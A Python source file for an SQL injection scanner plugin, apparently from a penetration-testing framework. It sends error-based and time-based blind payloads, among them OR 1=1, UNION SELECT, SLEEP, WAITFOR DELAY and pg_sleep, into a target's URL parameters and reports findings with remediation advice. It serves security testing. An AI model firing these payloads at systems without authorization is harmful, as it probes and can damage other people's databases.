"""SQL Injection scanner plugin.

Tests URL parameters for SQL injection vulnerabilities using
error-based and time-based blind detection techniques.
"""

import logging
import time
from urllib.parse import parse_qs, urlencode, urlparse, urlunparse

import httpx

from nightowl.core.plugin_base import ScannerPlugin
from nightowl.models.finding import Finding, Severity
from nightowl.models.target import Target

logger = logging.getLogger("nightowl")

# Error patterns by DBMS
SQL_ERROR_PATTERNS: dict[str, list[str]] = {
    "MySQL": [
        "you have an error in your sql syntax",
        "warning: mysql_",
        "unclosed quotation mark after the character string",
        "mysql_num_rows()",
        "mysql_fetch_array()",
        "supplied argument is not a valid mysql",
        "com.mysql.jdbc",
    ],
    "PostgreSQL": [
        "pg_query()",
        "pg_exec()",
        "unterminated quoted string",
        "syntax error at or near",
        "invalid input syntax for",
        "current transaction is aborted",
        "org.postgresql.util.psqlexception",
    ],
    "SQLite": [
        "sqlite3.operationalerror",
        "sqlite_error",
        "unrecognized token",
        "near \".\":",
        "near \"(\": syntax error",
        "sqlite3::exception",
    ],
    "MSSQL": [
        "microsoft ole db provider for sql server",
        "unclosed quotation mark after the character string",
        "incorrect syntax near",
        "[microsoft][odbc sql server driver]",
        "mssql_query()",
        "microsoft sql native client error",
        "sqlserver jdbc driver",
    ],
    "Oracle": [
        "ora-01756",
        "ora-00933",
        "oracle error",
        "quoted string not properly terminated",
        "sql command not properly ended",
    ],
}

# Payloads for error-based detection
ERROR_PAYLOADS: list[str] = [
    "'",
    "\"",
    "' OR '1'='1",
    "\" OR \"1\"=\"1",
    "' OR '1'='1' --",
    "' OR 1=1 --",
    "1' ORDER BY 1--",
    "1' UNION SELECT NULL--",
    "' AND 1=CONVERT(int,(SELECT @@version))--",
    "1;SELECT * FROM information_schema.tables--",
]

# Payloads for time-based blind detection
TIME_PAYLOADS: list[dict] = [
    {
        "payload": "' OR SLEEP(5)-- ",
        "dbms": "MySQL",
        "delay": 5,
    },
    {
        "payload": "'; WAITFOR DELAY '0:0:5'--",
        "dbms": "MSSQL",
        "delay": 5,
    },
    {
        "payload": "' OR pg_sleep(5)--",
        "dbms": "PostgreSQL",
        "delay": 5,
    },
    {
        "payload": "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)-- ",
        "dbms": "MySQL",
        "delay": 5,
    },
    {
        "payload": "' OR BENCHMARK(10000000,SHA1('test'))-- ",
        "dbms": "MySQL",
        "delay": 3,
    },
]


class SQLiScannerPlugin(ScannerPlugin):
    """Tests URL parameters for SQL injection vulnerabilities."""

    name = "sqli-scanner"
    description = "Error-based and time-based blind SQL injection detection"
    version = "1.0.0"
    stage = "scan"

    def __init__(self, config: dict | None = None):
        super().__init__(config)
        self.timeout: float = self.config.get("timeout", 15.0)
        self.user_agent: str = self.config.get("user_agent", "NightOwl/1.0")
        self.time_threshold: float = self.config.get("time_threshold", 4.0)
        self.max_params: int = self.config.get("max_params", 20)
        self.error_payloads: list[str] = self.config.get("error_payloads", ERROR_PAYLOADS)
        self.time_payloads: list[dict] = self.config.get("time_payloads", TIME_PAYLOADS)

    def _resolve_url(self, target: Target) -> str:
        if target.url:
            return target.url
        scheme = "https" if target.port in (443, 8443) else "http"
        port_part = "" if target.port in (80, 443, None) else f":{target.port}"
        host = target.domain or target.ip or target.host
        return f"{scheme}://{host}{port_part}"

    def _extract_params(self, url: str) -> dict[str, list[str]]:
        """Extract query parameters from a URL."""
        parsed = urlparse(url)
        return parse_qs(parsed.query)

    def _inject_param(self, url: str, param: str, payload: str) -> str:
        """Replace a single query parameter value with a payload."""
        parsed = urlparse(url)
        params = parse_qs(parsed.query, keep_blank_values=True)
        params[param] = [payload]
        flat = {k: v[0] for k, v in params.items()}
        new_query = urlencode(flat)
        return urlunparse(parsed._replace(query=new_query))

    def _check_error_patterns(self, body: str) -> tuple[str, str] | None:
        """Check response body for SQL error messages. Returns (dbms, matched_pattern)."""
        body_lower = body.lower()
        for dbms, patterns in SQL_ERROR_PATTERNS.items():
            for pattern in patterns:
                if pattern in body_lower:
                    return dbms, pattern
        return None

    async def _test_error_based(
        self, client: httpx.AsyncClient, url: str, param: str
    ) -> list[Finding]:
        """Test a parameter for error-based SQL injection."""
        findings: list[Finding] = []

        # Get baseline response to avoid false positives
        try:
            baseline = await client.get(url, headers={"User-Agent": self.user_agent})
            baseline_errors = self._check_error_patterns(baseline.text)
        except httpx.RequestError:
            return findings

        # If the baseline already contains SQL errors, skip (noisy target)
        if baseline_errors:
            logger.debug(
                f"[sqli-scanner] Baseline already has SQL errors for {param}, skipping error-based"
            )
            return findings

        for payload in self.error_payloads:
            injected_url = self._inject_param(url, param, payload)
            try:
                response = await client.get(
                    injected_url, headers={"User-Agent": self.user_agent}
                )
                match = self._check_error_patterns(response.text)
                if match:
                    dbms, pattern = match
                    findings.append(
                        Finding(
                            title=f"SQL Injection (Error-Based) in '{param}'",
                            description=(
                                f"The parameter '{param}' appears vulnerable to "
                                f"error-based SQL injection. A {dbms} error message "
                                f"was returned when injecting a crafted payload."
                            ),
                            severity=Severity.HIGH,
                            cvss_score=8.6,
                            category="sql-injection",
                            evidence=(
                                f"URL: {injected_url}\n"
                                f"Payload: {payload}\n"
                                f"DBMS: {dbms}\n"
                                f"Error pattern: {pattern}\n"
                                f"Status: {response.status_code}"
                            ),
                            remediation=(
                                "Use parameterized queries (prepared statements) for all "
                                "database interactions. Never concatenate user input into "
                                "SQL strings. Apply input validation and use an ORM where possible."
                            ),
                            references=[
                                "https://owasp.org/www-community/attacks/SQL_Injection",
                                "https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html",
                            ],
                            metadata={
                                "param": param,
                                "payload": payload,
                                "dbms": dbms,
                                "technique": "error-based",
                            },
                        )
                    )
                    # One confirmed finding per parameter is sufficient
                    return findings

            except httpx.RequestError as exc:
                logger.debug(f"[sqli-scanner] Error-based request failed: {exc}")
                continue

        return findings

    async def _test_time_based(
        self, client: httpx.AsyncClient, url: str, param: str
    ) -> list[Finding]:
        """Test a parameter for time-based blind SQL injection."""
        findings: list[Finding] = []

        # Measure baseline response time
        try:
            start = time.monotonic()
            await client.get(url, headers={"User-Agent": self.user_agent})
            baseline_time = time.monotonic() - start
        except httpx.RequestError:
            return findings

        for tpayload in self.time_payloads:
            payload = tpayload["payload"]
            expected_delay = tpayload["delay"]
            dbms = tpayload["dbms"]

            injected_url = self._inject_param(url, param, payload)
            try:
                start = time.monotonic()
                response = await client.get(
                    injected_url,
                    headers={"User-Agent": self.user_agent},
                    timeout=max(self.timeout, expected_delay + 10),
                )
                elapsed = time.monotonic() - start

                # If the response took significantly longer than baseline
                # and at least as long as our expected delay, it is likely vulnerable
                if (
                    elapsed >= (expected_delay - 1)
                    and elapsed > (baseline_time + self.time_threshold)
                ):
                    findings.append(
                        Finding(
                            title=f"SQL Injection (Time-Based Blind) in '{param}'",
                            description=(
                                f"The parameter '{param}' appears vulnerable to "
                                f"time-based blind SQL injection. A {dbms} time-delay "
                                f"payload caused the server to respond {elapsed:.1f}s "
                                f"later than the baseline ({baseline_time:.1f}s)."
                            ),
                            severity=Severity.CRITICAL,
                            cvss_score=9.8,
                            category="sql-injection",
                            evidence=(
                                f"URL: {injected_url}\n"
                                f"Payload: {payload}\n"
                                f"DBMS: {dbms}\n"
                                f"Baseline time: {baseline_time:.2f}s\n"
                                f"Injected time: {elapsed:.2f}s\n"
                                f"Expected delay: {expected_delay}s\n"
                                f"Status: {response.status_code}"
                            ),
                            remediation=(
                                "Use parameterized queries (prepared statements) for all "
                                "database interactions. Never concatenate user input into "
                                "SQL strings. Apply input validation and use an ORM where possible."
                            ),
                            references=[
                                "https://owasp.org/www-community/attacks/SQL_Injection",
                                "https://owasp.org/www-community/attacks/Blind_SQL_Injection",
                            ],
                            metadata={
                                "param": param,
                                "payload": payload,
                                "dbms": dbms,
                                "technique": "time-based-blind",
                                "baseline_time": round(baseline_time, 2),
                                "injected_time": round(elapsed, 2),
                            },
                        )
                    )
                    return findings

            except httpx.ReadTimeout:
                # A timeout can also indicate successful injection
                findings.append(
                    Finding(
                        title=f"SQL Injection (Time-Based Blind) in '{param}'",
                        description=(
                            f"The parameter '{param}' may be vulnerable to "
                            f"time-based blind SQL injection. A {dbms} time-delay "
                            f"payload caused the request to time out, suggesting "
                            f"the injected query was executed."
                        ),
                        severity=Severity.HIGH,
                        cvss_score=8.6,
                        category="sql-injection",
                        evidence=(
                            f"URL: {injected_url}\n"
                            f"Payload: {payload}\n"
                            f"DBMS: {dbms}\n"
                            f"Result: Request timed out (>{self.timeout}s)"
                        ),
                        remediation=(
                            "Use parameterized queries (prepared statements) for all "
                            "database interactions. Never concatenate user input into "
                            "SQL strings."
                        ),
                        references=[
                            "https://owasp.org/www-community/attacks/Blind_SQL_Injection",
                        ],
                        metadata={
                            "param": param,
                            "payload": payload,
                            "dbms": dbms,
                            "technique": "time-based-blind",
                            "result": "timeout",
                        },
                    )
                )
                return findings

            except httpx.RequestError as exc:
                logger.debug(f"[sqli-scanner] Time-based request failed: {exc}")
                continue

        return findings

    async def run(self, target: Target, **kwargs) -> list[Finding]:
        findings: list[Finding] = []
        url = self._resolve_url(target)
        params = self._extract_params(url)

        if not params:
            logger.info(f"[sqli-scanner] No query parameters found in {url}")
            return findings

        param_names = list(params.keys())[: self.max_params]
        logger.info(
            f"[sqli-scanner] Testing {len(param_names)} parameter(s) on {url}"
        )

        async with httpx.AsyncClient(
            verify=False, follow_redirects=True, timeout=self.timeout
        ) as client:
            for param in param_names:
                # Error-based tests first (faster)
                error_findings = await self._test_error_based(client, url, param)
                findings.extend(error_findings)

                # Only try time-based if error-based didn't find anything
                if not error_findings:
                    time_findings = await self._test_time_based(client, url, param)
                    findings.extend(time_findings)

        return findings
